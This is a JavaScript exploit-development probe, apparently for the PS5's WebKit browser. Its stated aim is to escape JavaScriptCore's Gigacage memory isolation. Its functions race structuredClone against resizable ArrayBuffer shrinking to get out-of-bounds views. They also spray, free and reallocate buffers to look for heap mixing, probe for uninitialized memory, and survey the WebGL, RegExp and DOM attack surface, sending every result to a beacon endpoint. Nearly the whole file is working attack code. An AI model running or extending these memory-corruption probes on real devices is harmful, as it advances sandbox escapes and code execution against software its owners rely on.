/* p77-wall — Break the Gigacage wall
 * Codex source analysis: RAB backing is in Primitive Gigacage virtual pages.
 * OOB within maxByteLength stays in our own reservation. Need to escape.
 *
 * STRATEGY A: Deserializer view/buffer mismatch
 *   structuredClone serializes view.byteLength THEN the backing buffer.
 *   If getter resizes between these → clone has view(4096) on buffer(64).
 *   Deserialized view is OOB on its own buffer!
 *
 * STRATEGY B: Test if Gigacage is even enabled on PS5
 *   PS5 may use system malloc (no Gigacage). If so, ArrayBuffer data
 *   and JSC objects share the same heap = our OOB reaches everything.
 *
 * STRATEGY C: Other attack surfaces (WebGL, RegExp, CSS, Workers)
 *
 * Beacon prefix: V77W-
 */
(function(){
"use strict";
var RUN_ID = "v77w" + Math.random().toString(36).slice(2,12);
var PREFIX = "V77W-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,900)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press77-wall breaker");

/* ====== S1: Deserializer view/buffer length mismatch ====== */
function test_S1() {
  var r = {};
  try {
    // Create RAB and a view
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var view = new Uint8Array(rab); // auto-length, tracks RAB size
    for (var i = 0; i < 4096; i++) view[i] = i & 0xFF;

    // Clone an object containing the VIEW (not buffer directly)
    // Getter shrinks RAB between view serialization and buffer serialization
    var obj = Object.create(null);
    obj.view = view; // view is serialized first, captures its byteLength
    Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
      rab.resize(64); // shrink backing buffer
      return 1;
    }});

    var cloned = structuredClone(obj);
    r.clonedViewLen = cloned.view.length;
    r.clonedBufLen = cloned.view.buffer.byteLength;
    r.MISMATCH = cloned.view.length > cloned.view.buffer.byteLength;

    // If mismatch: view can access past buffer end!
    if (r.MISMATCH) {
      try {
        r.oobRead = cloned.view[cloned.view.buffer.byteLength + 10];
        r.OOB_VIEW = true;
      } catch(e) {
        r.oobReadErr = e.message.slice(0,40);
      }
    }

    // Also check: can we create a DataView on the cloned buffer past its length?
    try {
      var dv = new DataView(cloned.view.buffer, 0, cloned.view.buffer.byteLength);
      r.dvOK = true;
    } catch(e) {
      r.dvErr = e.message.slice(0,40);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("S1-VIEW-MISMATCH", r);
}

/* ====== S2: Same but with fixed-length view ====== */
function test_S2() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    // Fixed-length view
    var fixedView = new Uint8Array(rab, 0, 4096);
    for (var i = 0; i < 4096; i++) fixedView[i] = i & 0xFF;

    var obj = Object.create(null);
    obj.fv = fixedView;
    Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
      rab.resize(64);
      return 1;
    }});

    try {
      var cloned = structuredClone(obj);
      r.clonedFvLen = cloned.fv.length;
      r.clonedBufLen = cloned.fv.buffer.byteLength;
      r.MISMATCH = cloned.fv.length > cloned.fv.buffer.byteLength;

      if (r.MISMATCH) {
        r.oobRead = cloned.fv[100];
        r.OOB_VIEW = cloned.fv[100] !== undefined;
      }
    } catch(e) {
      r.cloneErr = e.name + ":" + e.message.slice(0,50);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("S2-FIXED-MISMATCH", r);
}

/* ====== S3: View with offset + resize → offset past buffer end ====== */
function test_S3() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 4096; i++) u8[i] = i & 0xFF;

    // View starting at offset 2048, auto-length
    var offsetView = new Uint8Array(rab, 2048);
    r.offsetViewLen = offsetView.length; // 2048

    var obj = Object.create(null);
    obj.ov = offsetView;
    Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
      rab.resize(64); // now offset 2048 > buffer size 64
      return 1;
    }});

    try {
      var cloned = structuredClone(obj);
      r.clonedOvLen = cloned.ov.length;
      r.clonedBufLen = cloned.ov.buffer.byteLength;
      r.clonedOffset = cloned.ov.byteOffset;
      // If offset > buffer size in clone → entirely OOB view!
      r.OFFSET_PAST_END = cloned.ov.byteOffset >= cloned.ov.buffer.byteLength;
      if (cloned.ov.length > 0) {
        r.readByte0 = cloned.ov[0];
        r.OOB = true;
      }
    } catch(e) {
      r.cloneErr = e.name + ":" + e.message.slice(0,50);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("S3-OFFSET-OOB", r);
}

/* ====== S4: DataView clone with offset mismatch ====== */
function test_S4() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var dv = new DataView(rab, 1024, 2048); // offset 1024, length 2048

    var obj = Object.create(null);
    obj.dv = dv;
    Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
      rab.resize(64);
      return 1;
    }});

    try {
      var cloned = structuredClone(obj);
      r.clonedDvLen = cloned.dv.byteLength;
      r.clonedDvOffset = cloned.dv.byteOffset;
      r.clonedBufLen = cloned.dv.buffer.byteLength;
      r.MISMATCH = (cloned.dv.byteOffset + cloned.dv.byteLength) > cloned.dv.buffer.byteLength;

      if (r.MISMATCH) {
        try {
          r.oobRead = cloned.dv.getUint8(cloned.dv.buffer.byteLength - cloned.dv.byteOffset + 10);
          r.OOB = true;
        } catch(e) {
          r.oobReadErr = e.message.slice(0,40);
        }
      }
    } catch(e) {
      r.cloneErr = e.name + ":" + e.message.slice(0,50);
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("S4-DV-MISMATCH", r);
}

/* ====== G1: Is Gigacage enabled? ====== */
function test_G1() {
  var r = {};
  try {
    // Test 1: Allocate a regular AB and a RAB, check if their addresses
    // are in a similar range (we can't read addresses directly, but we
    // can test via timing or behavior differences)

    // Test 2: If Gigacage is disabled, ArrayBuffer data is in regular malloc.
    // Regular malloc allocations can be adjacent to JSC objects.
    // Create many ABs of different sizes and check if any contain non-zero
    // data (uninitialized heap = Gigacage might be off)

    var leaks = 0;
    var samples = [];
    for (var trial = 0; trial < 50; trial++) {
      // Allocate and immediately check for non-zero bytes
      // Use regular ArrayBuffer (not RAB) — these go through regular Gigacage::tryMalloc
      var ab = new ArrayBuffer(256);
      var v = new Uint8Array(ab);
      for (var i = 0; i < 256; i++) {
        if (v[i] !== 0) {
          leaks++;
          if (samples.length < 10) samples.push(trial + ":" + i + "=" + v[i]);
        }
      }
    }

    r.leaks = leaks;
    r.samples = samples.join(",");
    r.UNINITIALIZED_HEAP = leaks > 0; // if true → possible system malloc (no zeroed alloc)

    // Test 3: Allocation timing — Gigacage uses mmap (slow), system malloc uses brk/mmap mix
    var t0 = performance.now();
    var abs = [];
    for (var j = 0; j < 1000; j++) abs.push(new ArrayBuffer(64));
    var t1 = performance.now();
    abs = null;

    var t2 = performance.now();
    var rabs = [];
    for (var k = 0; k < 100; k++) rabs.push(new ArrayBuffer(64, { maxByteLength: 64 }));
    var t3 = performance.now();
    rabs = null;

    r.abAllocMs = (t1 - t0).toFixed(1);
    r.rabAllocMs = (t3 - t2).toFixed(1);
    r.rabSlower = (t3 - t2) > (t1 - t0) * 5; // RABs much slower = virtual pages = Gigacage

  } catch(e) { r.err = e.message.slice(0,80); }
  B("G1-GIGACAGE", r);
}

/* ====== G2: Regular AB spray + TOCTOU read — can we see AB metadata? ====== */
function test_G2() {
  var r = {};
  try {
    // Even in Gigacage, regular (non-RAB) ArrayBuffers use Gigacage::tryMalloc
    // which is bmalloc within the Primitive cage. These ARE potentially adjacent
    // to each other. RABs use virtual pages (separate).
    // BUT: butterflies (JSValue Gigacage) are in a DIFFERENT cage.

    // Test: spray regular ABs with markers, allocate RAB between them,
    // TOCTOU read from RAB — do we see the regular AB data?

    var pre = [];
    for (var i = 0; i < 200; i++) {
      var b = new ArrayBuffer(256);
      var v = new Uint8Array(b);
      for (var j = 0; j < 256; j++) v[j] = 0xDD;
      pre.push(b);
    }

    // RAB uses different allocation (virtual pages) — shouldn't be near regular ABs
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    for (var k = 0; k < 4096; k++) u8[k] = 0;

    var post = [];
    for (var m = 0; m < 200; m++) {
      var b2 = new ArrayBuffer(256);
      var v2 = new Uint8Array(b2);
      for (var n = 0; n < 256; n++) v2[n] = 0xEE;
      post.push(b2);
    }

    // TOCTOU read
    var obj = Object.create(null);
    obj.buf = rab;
    Object.defineProperty(obj, 'zz', { enumerable: true, get: function() {
      rab.resize(16);
      return 1;
    }});

    var cloned = structuredClone(obj);
    var cv = new Uint8Array(cloned.buf);

    var dd = 0, ee = 0, zero = 0, other = 0;
    for (var p = 16; p < cv.length; p++) {
      if (cv[p] === 0xDD) dd++;
      else if (cv[p] === 0xEE) ee++;
      else if (cv[p] === 0) zero++;
      else other++;
    }

    r.dd = dd;
    r.ee = ee;
    r.zero = zero;
    r.other = other;
    r.CROSS_ALLOC = dd > 0 || ee > 0;

    pre = null; post = null;
  } catch(e) { r.err = e.message.slice(0,80); }
  B("G2-CROSS-ALLOC", r);
}

/* ====== W1: WebGL availability ====== */
function test_W1() {
  var r = {};
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 64; canvas.height = 64;

    r.hasWebGL = false;
    r.hasWebGL2 = false;

    try {
      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        r.hasWebGL = true;
        r.vendor = gl.getParameter(gl.VENDOR);
        r.renderer = gl.getParameter(gl.RENDERER);
        r.version = gl.getParameter(gl.VERSION);
        r.glslVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
        r.maxTexSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
        // WebGL has been a rich source of OOB bugs
      }
    } catch(e) { r.webglErr = e.message.slice(0,40); }

    try {
      var gl2 = canvas.getContext('webgl2');
      if (gl2) {
        r.hasWebGL2 = true;
        r.gl2Version = gl2.getParameter(gl2.VERSION);
      }
    } catch(e) { r.webgl2Err = e.message.slice(0,40); }

    // OffscreenCanvas?
    r.hasOffscreen = typeof OffscreenCanvas !== 'undefined';

  } catch(e) { r.err = e.message.slice(0,80); }
  B("W1-WEBGL", r);
}

/* ====== W2: RegExp engine probe ====== */
function test_W2() {
  var r = {};
  try {
    // Test regex features that have historically had bugs in YARR

    // Lookbehind (added Safari 16.4+)
    try {
      var re = new RegExp('(?<=a)b');
      r.lookbehind = re.test('ab');
    } catch(e) { r.lookbehindErr = e.message.slice(0,30); }

    // Named groups
    r.namedGroups = /(?<year>\d{4})/.exec('2024') !== null;

    // Unicode property escapes
    try {
      var re2 = new RegExp('\\p{Emoji}', 'u');
      r.unicodeProp = re2.test('😀');
    } catch(e) { r.unicodePropErr = e.message.slice(0,30); }

    // Large quantifier (can cause stack overflow in YARR)
    try {
      var t0 = performance.now();
      var big = 'a'.repeat(100000);
      var re3 = /a{1,100000}/;
      r.bigQuantifier = re3.test(big);
      r.bigQuantMs = (performance.now() - t0).toFixed(1);
    } catch(e) { r.bigQuantErr = e.message.slice(0,30); }

    // Backreference + alternation (YARR JIT compilation)
    try {
      var re4 = /(a|b)\1{100}/;
      r.backref = re4.test('a' + 'a'.repeat(100));
    } catch(e) { r.backrefErr = e.message.slice(0,30); }

    // String.replace with function — can trigger YARR JIT
    var replaceCalls = 0;
    try {
      'aaa'.replace(/a/g, function() { replaceCalls++; return 'b'; });
      r.replaceCalls = replaceCalls;
    } catch(e) { r.replaceErr = e.message.slice(0,30); }

    // hasIndices (d flag) — Safari 17+
    try {
      var re5 = new RegExp('(a)', 'd');
      var m = re5.exec('a');
      r.hasIndices = m && m.indices !== undefined;
    } catch(e) { r.indicesErr = e.message.slice(0,30); }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("W2-REGEX", r);
}

/* ====== W3: CSS/DOM attack surface ====== */
function test_W3() {
  var r = {};
  try {
    // Test DOM/CSS features for exploitation potential
    r.hasShadowDOM = typeof HTMLElement.prototype.attachShadow === 'function';
    r.hasCustomElements = typeof customElements !== 'undefined';
    r.hasIntersectionObs = typeof IntersectionObserver !== 'undefined';
    r.hasMutationObs = typeof MutationObserver !== 'undefined';
    r.hasResizeObs = typeof ResizeObserver !== 'undefined';
    r.hasPerformanceObs = typeof PerformanceObserver !== 'undefined';

    // Trusted Types (security feature)
    r.hasTrustedTypes = typeof trustedTypes !== 'undefined';

    // Import maps
    r.hasImportMap = typeof HTMLScriptElement !== 'undefined' &&
                     'supports' in HTMLScriptElement ? HTMLScriptElement.supports('importmap') : false;

    // CSS Houdini
    r.hasPaintWorklet = typeof CSS !== 'undefined' && 'paintWorklet' in CSS;
    r.hasLayoutWorklet = typeof CSS !== 'undefined' && 'layoutWorklet' in CSS;

    // requestAnimationFrame (needed for rendering exploits)
    r.hasRAF = typeof requestAnimationFrame === 'function';

    // Canvas 2D features
    try {
      var c = document.createElement('canvas');
      var ctx = c.getContext('2d');
      r.hasCanvas2D = !!ctx;
      r.hasFilter = 'filter' in ctx;
    } catch(e) {}

    // createImageBitmap (used in some WebKit exploits)
    r.hasCreateImageBitmap = typeof createImageBitmap === 'function';

  } catch(e) { r.err = e.message.slice(0,80); }
  B("W3-DOM", r);
}

/* ====== W4: ArrayBuffer + JSC object interleaving test ====== */
function test_W4() {
  var r = {};
  try {
    // Even if Gigacage is enabled, there may be cases where non-Gigacage
    // ArrayBuffer allocations exist (e.g., small ABs might use fastMalloc)
    // Test: allocate tiny ABs and check if they're near each other

    var addrs = [];
    // We can't read addresses, but we can check if content from one leaks into another

    // Allocate AB, free it, allocate object, check if object landed in AB slot
    var bufs = [];
    for (var i = 0; i < 500; i++) {
      var b = new ArrayBuffer(32);
      var v = new Uint8Array(b);
      for (var j = 0; j < 32; j++) v[j] = 0xAB;
      bufs.push(b);
    }

    // Free every other buffer
    for (var k = 0; k < bufs.length; k += 2) bufs[k] = null;

    // Force GC by allocating garbage
    var g = [];
    for (var m = 0; m < 100000; m++) g.push({x: m});
    g = null;

    // Now allocate objects in (hopefully) freed AB slots
    var objs = [];
    for (var n = 0; n < 500; n++) {
      objs.push({ a: 0x41414141, b: n, c: "marker" });
    }

    // Check surviving buffers for corruption (JSC object data landing in AB)
    var corrupted = 0;
    var interesting = [];
    for (var p = 1; p < bufs.length; p += 2) {
      if (bufs[p]) {
        var v2 = new Uint8Array(bufs[p]);
        for (var q = 0; q < 32; q++) {
          if (v2[q] !== 0xAB) {
            corrupted++;
            if (interesting.length < 5) interesting.push(p + "[" + q + "]=" + v2[q]);
            break;
          }
        }
      }
    }

    r.corrupted = corrupted;
    r.interesting = interesting.join(",");
    r.HEAP_MIX = corrupted > 0;

    objs = null;
  } catch(e) { r.err = e.message.slice(0,80); }
  B("W4-HEAP-MIX", r);
}

/* ====== Run ====== */
try {
  test_S1();
  setTimeout(test_S2, 300);
  setTimeout(test_S3, 600);
  setTimeout(test_S4, 900);
  setTimeout(test_G1, 1200);
  setTimeout(test_G2, 1500);
  setTimeout(test_W1, 1800);
  setTimeout(test_W2, 2100);
  setTimeout(test_W3, 2400);
  setTimeout(test_W4, 2700);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe77-done"); }, 20000);
})();
